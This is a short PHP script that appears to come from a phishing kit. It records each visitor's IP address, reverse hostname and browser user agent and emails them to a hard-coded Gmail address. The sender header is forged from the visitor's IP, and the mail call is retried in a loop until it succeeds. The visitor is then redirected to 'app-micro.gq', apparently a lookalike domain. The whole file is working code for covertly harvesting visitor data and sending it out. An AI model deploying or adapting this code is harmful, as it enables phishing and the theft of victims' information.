<?php
$mail_to = "hn.pro.961@gmail.com";
$subject = "App-Micro - Map";



$message .= "| Adresse IP : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$message .= "| Navigateur : " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= "+ -----------------------------------------------------------\r\n";

$header  = "From: " . $_SERVER['REMOTE_ADDR'] . " <amp_" . rand(111, 999) . ">\r\n";
$header .= "MIME-Version: 1.0\r\n";

do {
	$send = mail($mail_to, $subject, $message, $header);
} while (!$send);
header("Location:https://app-micro.gq/");
?>